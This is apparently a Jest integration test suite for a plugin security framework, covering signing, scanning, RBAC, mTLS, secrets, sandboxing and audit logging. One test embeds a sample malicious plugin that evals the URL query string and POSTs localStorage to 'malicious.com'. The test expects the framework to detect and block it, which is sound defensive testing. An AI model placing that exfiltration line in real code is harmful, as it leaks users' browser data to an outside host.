/**
 * Integration Test Suite for Complete Security Framework
 * Tests end-to-end security workflows and component interactions
 */

import { describe, test, expect, beforeEach, afterEach, beforeAll, afterAll } from '@jest/globals';
import { PluginSandbox } from '../../src/security/isolation/plugin-sandbox';
import { SecurityPolicyEngine } from '../../src/security/policies/security-policy';
import { RBACSystem } from '../../src/security/auth/rbac-system';
import { mTLSAuthenticationSystem } from '../../src/security/auth/mtls-auth';
import { SecretManager } from '../../src/security/secrets/secret-manager';
import { SecurityScanner } from '../../src/security/scanning/security-scanner';
import { PluginVerifier } from '../../src/security/verification/plugin-verifier';
import { ThreatDetector } from '../../src/security/detection/threat-detector';
import { AuditLogger } from '../../src/security/logging/audit-logger';

describe('Security Framework Integration', () => {
  let pluginSandbox: PluginSandbox;
  let securityPolicy: SecurityPolicyEngine;
  let rbacSystem: RBACSystem;
  let mtlsAuth: mTLSAuthenticationSystem;
  let secretManager: SecretManager;
  let securityScanner: SecurityScanner;
  let pluginVerifier: PluginVerifier;
  let threatDetector: ThreatDetector;
  let auditLogger: AuditLogger;

  beforeAll(async () => {
    // Initialize all security components
    auditLogger = new AuditLogger();
    securityPolicy = new SecurityPolicyEngine();
    rbacSystem = new RBACSystem();
    mtlsAuth = new mTLSAuthenticationSystem({
      caPrivateKeyPath: '/tmp/ca-key.pem',
      caCertificatePath: '/tmp/ca-cert.pem',
      certificateValidityDays: 365,
      keySize: 2048,
      signatureAlgorithm: 'SHA256',
      cipherSuites: ['ECDHE-ECDSA-AES256-GCM-SHA384'],
      minimumTLSVersion: '1.2',
      certificateRevocationEnabled: true,
      ocspEnabled: false
    });
    secretManager = new SecretManager();
    securityScanner = new SecurityScanner();
    pluginVerifier = new PluginVerifier();
    threatDetector = new ThreatDetector();
    pluginSandbox = new PluginSandbox();
  });

  afterAll(async () => {
    // Cleanup resources
    await auditLogger.flush();
  });

  describe('Complete Plugin Security Lifecycle', () => {
    test('should demonstrate end-to-end secure plugin deployment', async () => {
      // Step 1: Plugin code signing and verification
      const pluginCode = Buffer.from(`
        // Sample plugin code
        export default function myPlugin() {
          return { name: 'My Secure Plugin', version: '1.0.0' };
        }
      `);

      // Generate signing key
      const signingKey = await pluginVerifier.generateSigningKey({
        algorithm: 'RSA-SHA256',
        keySize: 2048,
        validFor: 365,
        permissions: ['sign_plugins'],
        metadata: { purpose: 'plugin_signing' }
      });

      // Sign the plugin
      const signature = await pluginVerifier.signPlugin(
        'secure-test-plugin',
        '1.0.0',
        pluginCode,
        signingKey.keyId,
        { author: 'security-test' }
      );

      expect(signature.status).toBe('valid');

      // Step 2: Create provenance record
      const provenance = await pluginVerifier.createProvenance({
        pluginId: 'secure-test-plugin',
        pluginVersion: '1.0.0',
        buildInfo: {
          buildId: 'build-12345',
          buildTime: new Date(),
          buildEnvironment: 'secure-ci',
          builder: 'github-actions',
          sourceCommit: 'abc123def456',
          sourceRepository: 'https://github.com/org/secure-test-plugin',
          buildArtifacts: [{
            name: 'plugin.js',
            hash: 'sha256:abc123',
            size: pluginCode.length
          }]
        },
        dependencies: [{
          name: 'react',
          version: '18.0.0',
          source: 'npm',
          integrity: 'sha256:react123',
          license: 'MIT'
        }],
        attestations: [],
        supplyChain: {
          sourceVerified: true,
          buildReproducible: true,
          dependenciesVerified: true,
          vulnerabilitiesScanned: true,
          licenseCompliant: true
        }
      });

      expect(provenance.trustScore).toBeGreaterThan(80);

      // Step 3: Verify plugin with policies
      const verificationResult = await pluginVerifier.verifyPlugin(
        'secure-test-plugin',
        '1.0.0',
        pluginCode
      );

      expect(verificationResult.status).toBe('verified');
      expect(verificationResult.trustScore).toBeGreaterThan(70);

      // Step 4: Security scanning
      const scanConfig = await securityScanner.createScanConfig({
        name: 'Plugin Security Scan',
        type: 'sast',
        scope: {
          targets: ['secure-test-plugin']
        },
        createdBy: 'security-system'
      });

      const scanResult = await securityScanner.executeScan(scanConfig.scanId);
      expect(scanResult.status).toBe('completed');

      // Step 5: Create RBAC permissions
      const pluginPermission = await rbacSystem.createPermission({
        name: 'Execute Secure Plugin',
        description: 'Permission to execute the secure test plugin',
        resource: 'plugin',
        action: 'execute',
        effect: 'allow',
        metadata: { pluginId: 'secure-test-plugin' },
        isActive: true
      });

      const developerRole = await rbacSystem.createRole({
        name: 'Plugin Developer',
        description: 'Role for plugin developers',
        permissions: [pluginPermission.permissionId],
        metadata: {},
        isActive: true,
        isSystem: false
      });

      // Step 6: Create mTLS service identity
      const serviceIdentity = await mtlsAuth.createServiceIdentity(
        'secure-test-plugin-service',
        'plugin',
        {
          commonName: 'secure-test-plugin.internal',
          organization: 'Portal Platform',
          keyUsage: ['digitalSignature', 'keyEncipherment'],
          validityDays: 90
        },
        {
          allowedPeers: ['portal-gateway'],
          environment: 'production',
          namespace: 'plugins',
          endpoints: [{
            protocol: 'https',
            host: 'secure-test-plugin.internal',
            port: 8080
          }]
        }
      );

      expect(serviceIdentity.isActive).toBe(true);

      // Step 7: Create plugin secrets
      const pluginSecret = await secretManager.createSecret(
        {
          name: 'secure-plugin-api-key',
          description: 'API key for secure plugin',
          type: 'api_key',
          category: 'api',
          metadata: { pluginId: 'secure-test-plugin' },
          tags: ['plugin', 'api'],
          accessPolicy: {
            allowedServices: ['secure-test-plugin-service'],
            allowedEnvironments: ['production'],
            requiresMFA: false,
            maxAccessCount: 1000
          },
          compliance: {
            classification: 'confidential',
            encryptionRequired: true,
            auditRequired: true
          },
          ownerService: 'secure-test-plugin',
          createdBy: 'security-system'
        },
        'sk_test_12345abcdef',
        {
          userId: 'security-system',
          serviceId: 'plugin-deployer',
          operation: 'create',
          environment: 'production',
          requestId: 'deploy-123',
          timestamp: new Date()
        }
      );

      expect(pluginSecret.status).toBe('active');

      // Step 8: Deploy to sandbox
      const sandboxConfig = {
        pluginId: 'secure-test-plugin',
        pluginVersion: '1.0.0',
        resourceLimits: {
          cpu: '500m',
          memory: '512Mi',
          storage: '1Gi',
          networkBandwidth: '10Mbps',
          maxConnections: 100,
          maxFileDescriptors: 1024,
          maxProcesses: 50,
          executionTimeLimit: 3600
        },
        networkPolicy: {
          allowedEgress: ['api.internal.com'],
          allowedIngress: ['portal-gateway'],
          dnsPolicy: 'ClusterFirst' as const,
          enableServiceMesh: true,
          requireTLS: true,
          allowedPorts: [8080],
          blockedDomains: []
        },
        securityContext: {
          runAsNonRoot: true,
          runAsUser: 65534,
          runAsGroup: 65534,
          readOnlyRootFilesystem: true,
          allowPrivilegeEscalation: false,
          capabilities: {
            drop: ['ALL'],
            add: []
          }
        },
        mountRestrictions: {
          allowedMountTypes: ['emptyDir', 'secret'],
          readOnlyMounts: ['/secrets'],
          forbiddenPaths: ['/proc', '/sys'],
          maxMountPoints: 5,
          requireEncryption: true
        },
        runtimePolicy: {
          allowedSyscalls: ['read', 'write', 'open', 'close'],
          blockedSyscalls: ['exec', 'ptrace'],
          maxFileSize: 10 * 1024 * 1024,
          maxNetworkConnections: 50,
          executionMonitoring: true,
          behaviorAnalysis: true
        }
      };

      const sandbox = await pluginSandbox.createSandbox(sandboxConfig);
      expect(sandbox.status).toBe('initializing');

      // Step 9: Verify complete security posture
      const sandboxHealth = await pluginSandbox.getSandboxHealth(sandbox.instanceId);
      expect(sandboxHealth.complianceStatus).toBe('compliant');
      expect(sandboxHealth.securityScore).toBeGreaterThan(80);

      // Step 10: Audit trail verification
      const auditMetrics = await auditLogger.getMetrics({
        startTime: new Date(Date.now() - 60000), // Last minute
        eventTypes: ['PLUGIN_SIGNED', 'PLUGIN_VERIFIED', 'SANDBOX_CREATED']
      });

      expect(auditMetrics.totalEvents).toBeGreaterThan(0);
      expect(auditMetrics.eventsByType['PLUGIN_SIGNED']).toBe(1);
      expect(auditMetrics.eventsByType['SANDBOX_CREATED']).toBe(1);
    });

    test('should handle security violations and enforcement', async () => {
      // Create a malicious plugin scenario
      const maliciousCode = Buffer.from(`
        // Malicious plugin code
        eval(document.location.search);
        fetch('http://malicious.com/exfiltrate', { method: 'POST', body: localStorage });
      `);

      // Step 1: Attempt to verify malicious plugin
      const verificationResult = await pluginVerifier.verifyPlugin(
        'malicious-plugin',
        '1.0.0',
        maliciousCode
      );

      expect(verificationResult.status).toBe('failed');
      expect(verificationResult.trustScore).toBeLessThan(50);
      expect(verificationResult.riskFactors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ factor: 'code_injection' }),
          expect.objectContaining({ factor: 'network_access' })
        ])
      );

      // Step 2: Security scanner should detect threats
      const scanConfig = await securityScanner.createScanConfig({
        name: 'Malicious Plugin Scan',
        type: 'sast',
        scope: {
          targets: ['malicious-plugin']
        },
        createdBy: 'security-system'
      });

      const scanResult = await securityScanner.executeScan(scanConfig.scanId);
      expect(scanResult.summary.vulnerabilities.high).toBeGreaterThan(0);

      // Step 3: Threat detector should identify malicious behavior
      const threatAnalysis = await threatDetector.analyzeEvent({
        type: 'plugin_verification',
        source: {
          ip: '192.168.1.100',
          userId: 'test-user'
        },
        context: {
          pluginId: 'malicious-plugin',
          verificationResult: verificationResult
        }
      });

      expect(threatAnalysis.isThreat).toBe(true);
      expect(threatAnalysis.riskScore).toBeGreaterThan(70);

      // Step 4: RBAC should block deployment
      const accessDecision = await rbacSystem.checkAccess({
        userId: 'test-user',
        resource: 'plugin',
        action: 'deploy',
        context: {
          pluginId: 'malicious-plugin',
          trustScore: verificationResult.trustScore,
          timestamp: new Date()
        }
      });

      expect(accessDecision.decision).toBe('deny');

      // Step 5: Sandbox creation should be blocked
      const sandboxConfig = {
        pluginId: 'malicious-plugin',
        pluginVersion: '1.0.0',
        resourceLimits: {
          cpu: '100m',
          memory: '128Mi',
          storage: '512Mi',
          networkBandwidth: '1Mbps',
          maxConnections: 10,
          maxFileDescriptors: 100,
          maxProcesses: 5,
          executionTimeLimit: 600
        },
        networkPolicy: {
          allowedEgress: [],
          allowedIngress: [],
          dnsPolicy: 'None' as const,
          enableServiceMesh: false,
          requireTLS: true,
          allowedPorts: [],
          blockedDomains: ['*']
        },
        securityContext: {
          runAsNonRoot: true,
          runAsUser: 65534,
          runAsGroup: 65534,
          readOnlyRootFilesystem: true,
          allowPrivilegeEscalation: false,
          capabilities: {
            drop: ['ALL'],
            add: []
          }
        },
        mountRestrictions: {
          allowedMountTypes: [],
          readOnlyMounts: [],
          forbiddenPaths: ['*'],
          maxMountPoints: 0,
          requireEncryption: true
        },
        runtimePolicy: {
          allowedSyscalls: [],
          blockedSyscalls: ['*'],
          maxFileSize: 0,
          maxNetworkConnections: 0,
          executionMonitoring: true,
          behaviorAnalysis: true
        }
      };

      // Should be blocked by threat detection
      await expect(pluginSandbox.createSandbox(sandboxConfig))
        .rejects
        .toThrow();
    });
  });

  describe('Cross-Component Security Integration', () => {
    test('should coordinate security policies across all components', async () => {
      // Create a comprehensive security policy
      const policy = await securityPolicy.createPolicy({
        name: 'Comprehensive Security Policy',
        category: 'access_control',
        rules: [
          {
            ruleId: 'require-signature',
            name: 'Require Plugin Signature',
            description: 'All plugins must be digitally signed',
            condition: '$.signature != null',
            action: 'deny'
          },
          {
            ruleId: 'trust-score-check',
            name: 'Minimum Trust Score',
            description: 'Plugin trust score must be >= 70',
            condition: '$.trustScore >= 70',
            action: 'deny'
          }
        ],
        createdBy: 'security-admin'
      });

      // Apply policy to plugin verification
      const mockContext = {
        pluginId: 'test-plugin',
        instanceId: 'test-instance',
        userId: 'test-user',
        operation: 'deploy',
        resource: 'plugin',
        attributes: { trustScore: 85, signature: 'valid' },
        environment: 'production' as const,
        timestamp: new Date()
      };

      const policyResults = await securityPolicy.evaluatePolicies(mockContext);
      expect(policyResults).toHaveLength(1);
      expect(policyResults[0].decision).toBe('allow');

      // Verify audit logging captures all events
      const auditMetrics = await auditLogger.getMetrics({
        startTime: new Date(Date.now() - 30000)
      });

      expect(auditMetrics.totalEvents).toBeGreaterThan(0);
    });

    test('should handle cascading security failures', async () => {
      // Simulate a chain of security failures
      
      // 1. Certificate expiration
      const expiredCert = 'expired-cert-data';
      const mtlsValidation = await mtlsAuth.validateCertificate(expiredCert);
      expect(mtlsValidation.isValid).toBe(false);
      expect(mtlsValidation.errors).toContain('Certificate has expired');

      // 2. This should trigger threat detection
      await threatDetector.reportSecurityEvent({
        type: 'certificate_expired',
        severity: 'high',
        context: { certificateFingerprint: 'abc123' }
      });

      // 3. Which should update security policies
      await securityPolicy.monitorRuntimeEvent({
        eventType: 'CERTIFICATE_EXPIRED',
        pluginId: 'affected-plugin',
        instanceId: 'affected-instance',
        details: { severity: 'high' }
      });

      // 4. And block further operations
      const accessDecision = await rbacSystem.checkAccess({
        userId: 'test-user',
        resource: 'plugin',
        action: 'execute',
        context: {
          certificateStatus: 'expired',
          timestamp: new Date()
        }
      });

      expect(accessDecision.decision).toBe('deny');
      expect(accessDecision.reason).toContain('certificate');
    });

    test('should maintain security during component failures', async () => {
      // Test fail-safe behavior when components are unavailable
      
      // Mock component failures
      const originalMethod = threatDetector.analyzeEvent;
      threatDetector.analyzeEvent = jest.fn().mockRejectedValue(new Error('Component unavailable'));

      try {
        // Security operations should still enforce baseline security
        const accessDecision = await rbacSystem.checkAccess({
          userId: 'test-user',
          resource: 'plugin',
          action: 'execute',
          context: {
            timestamp: new Date()
          }
        });

        // Should default to deny when threat detection is unavailable
        expect(accessDecision.decision).toBe('deny');
        expect(accessDecision.reason).toContain('security service unavailable');

      } finally {
        // Restore original method
        threatDetector.analyzeEvent = originalMethod;
      }
    });
  });

  describe('Performance and Scalability Under Security Load', () => {
    test('should maintain performance with multiple concurrent security operations', async () => {
      const operations = [];
      const startTime = Date.now();

      // Create 10 concurrent plugin verifications
      for (let i = 0; i < 10; i++) {
        const pluginCode = Buffer.from(`export default () => ({ id: ${i} })`);
        operations.push(
          pluginVerifier.verifyPlugin(`plugin-${i}`, '1.0.0', pluginCode)
        );
      }

      // Create 10 concurrent RBAC checks
      for (let i = 0; i < 10; i++) {
        operations.push(
          rbacSystem.checkAccess({
            userId: `user-${i}`,
            resource: 'plugin',
            action: 'read',
            context: { timestamp: new Date() }
          })
        );
      }

      // Create 10 concurrent secret accesses
      for (let i = 0; i < 10; i++) {
        operations.push(
          secretManager.createSecret(
            {
              name: `secret-${i}`,
              type: 'password',
              category: 'application',
              metadata: {},
              tags: ['test'],
              accessPolicy: {
                allowedServices: ['test-service'],
                allowedEnvironments: ['development'],
                requiresMFA: false
              },
              compliance: {
                classification: 'internal',
                encryptionRequired: true,
                auditRequired: false
              },
              ownerService: 'test',
              createdBy: 'test'
            },
            `password-${i}`,
            {
              userId: 'test-user',
              serviceId: 'test-service',
              operation: 'create',
              environment: 'development',
              requestId: `req-${i}`,
              timestamp: new Date()
            }
          )
        );
      }

      const results = await Promise.allSettled(operations);
      const endTime = Date.now();
      const duration = endTime - startTime;

      // All operations should complete within reasonable time
      expect(duration).toBeLessThan(10000); // 10 seconds

      // Most operations should succeed
      const successful = results.filter(r => r.status === 'fulfilled').length;
      const failed = results.filter(r => r.status === 'rejected').length;

      expect(successful).toBeGreaterThan(failed);
      expect(successful).toBeGreaterThan(20); // At least 20 out of 30 operations
    });

    test('should handle security event bursts without degradation', async () => {
      const eventCount = 100;
      const events = Array.from({ length: eventCount }, (_, i) => ({
        type: 'plugin_access',
        source: {
          ip: `192.168.1.${100 + (i % 155)}`,
          userId: `user-${i % 10}`
        },
        context: {
          pluginId: `plugin-${i % 5}`,
          timestamp: new Date()
        }
      }));

      const startTime = Date.now();
      const analysisPromises = events.map(event => 
        threatDetector.analyzeEvent(event).catch(error => ({ error: error.message }))
      );

      const results = await Promise.all(analysisPromises);
      const endTime = Date.now();
      const duration = endTime - startTime;

      // Should process all events within reasonable time
      expect(duration).toBeLessThan(5000); // 5 seconds

      // Calculate success rate
      const successful = results.filter(r => !r.error).length;
      const successRate = (successful / eventCount) * 100;

      expect(successRate).toBeGreaterThan(80); // 80% success rate under load
    });
  });

  describe('Compliance and Audit Requirements', () => {
    test('should maintain comprehensive audit trails', async () => {
      const testOperations = [
        'plugin_verification',
        'secret_access',
        'rbac_check',
        'sandbox_creation',
        'policy_evaluation'
      ];

      // Perform various security operations
      for (const operation of testOperations) {
        await auditLogger.logSecurityEvent({
          eventType: operation.toUpperCase(),
          userId: 'test-user',
          details: { operation, timestamp: new Date() }
        });
      }

      // Query audit logs
      const auditResults = await auditLogger.queryLogs({
        startTime: new Date(Date.now() - 60000),
        eventTypes: testOperations.map(op => op.toUpperCase())
      });

      expect(auditResults.events).toHaveLength(testOperations.length);

      // Verify integrity
      const integrityResult = await auditLogger.verifyIntegrity(auditResults.events);
      expect(integrityResult.isValid).toBe(true);
      expect(integrityResult.invalidEvents).toHaveLength(0);
      expect(integrityResult.tamperedEvents).toHaveLength(0);

      // Generate compliance report
      const complianceReport = await auditLogger.generateComplianceReport({
        framework: 'SOC2',
        startTime: new Date(Date.now() - 3600000), // 1 hour ago
        endTime: new Date()
      });

      expect(complianceReport.summary.totalEvents).toBeGreaterThan(0);
      expect(complianceReport.summary.coverage).toBeGreaterThan(80);
    });

    test('should support regulatory compliance requirements', async () => {
      // Test GDPR compliance
      const gdprCompliantSecret = await secretManager.createSecret(
        {
          name: 'gdpr-compliant-secret',
          type: 'personal_data',
          category: 'application',
          metadata: { containsPII: true },
          tags: ['gdpr', 'pii'],
          accessPolicy: {
            allowedServices: ['data-processor'],
            allowedEnvironments: ['production'],
            requiresMFA: true
          },
          compliance: {
            classification: 'restricted',
            retentionPeriod: 365, // 1 year
            jurisdiction: 'EU',
            encryptionRequired: true,
            auditRequired: true
          },
          ownerService: 'user-service',
          createdBy: 'gdpr-admin'
        },
        'sensitive-user-data',
        {
          userId: 'gdpr-admin',
          serviceId: 'user-service',
          operation: 'create',
          environment: 'production',
          requestId: 'gdpr-001',
          timestamp: new Date()
        }
      );

      expect(gdprCompliantSecret.compliance.jurisdiction).toBe('EU');
      expect(gdprCompliantSecret.accessPolicy.requiresMFA).toBe(true);

      // Test SOC2 compliance
      const soc2Report = await securityScanner.generateSecurityReport({
        timeRange: {
          from: new Date(Date.now() - 86400000), // 24 hours ago
          to: new Date()
        },
        format: 'json',
        includeCompliance: true
      });

      expect(soc2Report.summary.complianceScore).toBeGreaterThan(80);
    });
  });
});